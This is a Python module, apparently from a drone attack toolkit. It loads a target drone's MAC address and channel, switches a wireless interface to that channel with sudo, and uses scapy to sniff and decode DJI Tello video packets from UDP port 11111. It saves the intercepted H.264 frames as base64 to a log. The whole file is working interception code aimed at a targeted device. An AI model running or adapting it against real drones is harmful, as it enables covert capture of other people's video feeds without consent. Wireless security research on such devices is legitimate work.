import os
import json
import time
import base64
import socket
import threading
import subprocess
from src.utils import sudo_exec
from scapy.all import sniff, Raw

##################
### PREP MODULE ##
##################

class VideoSniffer:
    def __init__(self):

        # Get path to project root directory (two levels up from this file)
        target_data_file = os.path.join(os.path.dirname(__file__), '..', '..', "data", "module_input_data.json")
        scan_info = None

        # Intialize target drone data
        with open(target_data_file, 'r') as file:
            scan_info = json.load(file)

        target_info = scan_info.get("target_info", {})
        self.target_mac = target_info.get("mac_address")
        self.target_channel = target_info.get("channel")

        options_info = scan_info.get("options", {})
        self.packets = options_info.get("packets")
        self.interface = options_info.get("interface")

        self.output_data_file = os.path.join(os.path.dirname(__file__), '..', '..', "data", "sniff_output.log")
        # Append mode: preserves existing data for debugging, adds session separator
        with open(self.output_data_file, 'a') as f:
            f.write(f"\n\n=== VIDEO CAPTURE SESSION START: {time.time()} ===\n")

        protocol = "udp" # UDP/TCP
        direction = "port" # Sniffing packets outgoing FROM the port
        self.port = 11111 # Port to sniff
        self.drone_ip = "192.168.10.1" # TELLO default IP

        self.bpf_filter = f"{protocol} {direction} {self.port} and src {self.drone_ip}"
        
        # TELLO frame tracking
        self.last_frame_num = None  # Track frame sequence numbers for loss detection
        self.cached_sps_pps = []  # Cache for SPS/PPS NAL units (types 7, 8)
        
    def parse_tello_frame_header(self, payload):
        """
        Parses TELLO's custom UDP frame header with robust handling for variable lengths.
        TELLO frame format:
          Bytes 0-1: Frame sequence number (big-endian, 16-bit)
          Byte 2:    Frame type / flags (indicates if header has size field)
          Byte 3-4:  Frame size (optional, present if certain flags set)
        Returns: (frame_num, header_size) or (None, None) on error.
        """
        if len(payload) < 3:
            return None, None
        
        try:
            frame_num = int.from_bytes(payload[0:2], byteorder='big')
            frame_type = payload[2]
            
            # Determine header size based on frame type byte
            # Bit 7: size_flag (1 = has 2-byte size field, 0 = no size field)
            has_size_field = (frame_type >> 7) & 1
            
            # Calculate header size
            if has_size_field and len(payload) >= 5:
                # Header includes frame size field (5 bytes total: seq + type + size)
                frame_size = int.from_bytes(payload[3:5], byteorder='big')
                header_size = 5
                
                # Validate frame_size against actual payload length
                if header_size + frame_size > len(payload):
                    print(f"Warning: Frame size {frame_size} exceeds payload length {len(payload) - header_size}")
            else:
                # Header is just sequence number (2 bytes)
                header_size = 2
            
            return frame_num, header_size
        except Exception as e:
            print(f"Error parsing TELLO frame header: {e}")
            return None, None
    
    def get_nal_unit_type(self, payload, offset):
        """
        Extracts NAL unit type from the first byte after TELLO header.
        Returns NAL type (0-31) or None if invalid.
        """
        if len(payload) <= offset:
            return None
        
        try:
            nal_header = payload[offset]
            nal_type = nal_header & 0x1F  # Bottom 5 bits
            return nal_type
        except Exception:
            return None
    
    def detect_packet_loss(self, frame_num):
        """
        Detects frame loss by comparing current frame number with last received.
        """
        if self.last_frame_num is not None:
            expected_next = (self.last_frame_num + 1) & 0xFFFF  # 16-bit wraparound
            if frame_num != expected_next:
                loss_count = (frame_num - expected_next) & 0xFFFF
                print(f"Warning: Detected {loss_count} lost packets (frame {expected_next} -> {frame_num})")
        self.last_frame_num = frame_num
    
    def emit_nal_unit(self, nal_unit):
        """
        Writes NAL unit to log file (optionally prepended with cached SPS/PPS).
        """
        if nal_unit is None or len(nal_unit) == 0:
            return
        
        try:
            nal_type = nal_unit[0] & 0x1F
            
            # Cache SPS/PPS for later use
            if nal_type in [7, 8]:  # SPS or PPS
                self.cached_sps_pps = [nal_unit] if nal_type == 7 else self.cached_sps_pps + [nal_unit]
            
            # Prepend cached SPS/PPS before coded slices
            output_units = []
            if nal_type in [1, 5]:  # Non-IDR or IDR slice
                output_units.extend(self.cached_sps_pps)
            output_units.append(nal_unit)
            
            # Encode and write all units
            for unit in output_units:
                b64_data = base64.b64encode(unit).decode('utf-8')
                with open(self.output_data_file, 'a') as f:
                    f.write(f"{b64_data}\n")
                    f.flush()
            
            print(f"Captured NAL type {nal_type}, {len(nal_unit)} bytes from {self.target_mac}.")
        except Exception as e:
            print(f"Error emitting NAL unit: {e}")
        
    def packet_handler(self, packet):
        """
        Handles TELLO H.264 video packets with custom frame header.
        Extracts TELLO frame header, detects packet loss, and emits NAL units.
        """

        if packet.haslayer(Raw):
            try:
                payload = packet[Raw].load
                
                # Parse TELLO frame header
                frame_num, header_size = self.parse_tello_frame_header(payload)
                if frame_num is None:
                    return
                
                # Detect packet loss
                self.detect_packet_loss(frame_num)
                
                # Get NAL unit type (after TELLO header)
                nal_type = self.get_nal_unit_type(payload, header_size)
                if nal_type is None:
                    return
                
                # Extract NAL unit (everything after TELLO header)
                nal_unit = payload[header_size:]
                
                # Emit NAL unit directly (no fragmentation reassembly needed)
                self.emit_nal_unit(nal_unit)
                
            except Exception as e:
                print(f"Error processing packet: {e}")

##################
## START MODULE ##
##################

Sniffer = VideoSniffer()

# Targeting specific channel of target drone
sudo_exec(f"iwconfig {Sniffer.interface} channel {Sniffer.target_channel}")

print(f"Started sniffing with filter: {Sniffer.bpf_filter}\n")

try:
    sniff(iface=Sniffer.interface,
          filter=Sniffer.bpf_filter,
          prn=Sniffer.packet_handler,
          timeout=Sniffer.packets,
          store=0 # Causes RAM issues if you store
        )
    print("Sniffing complete.\n")
except Exception as e:
    print(f"Sniffer crashed: {e}")

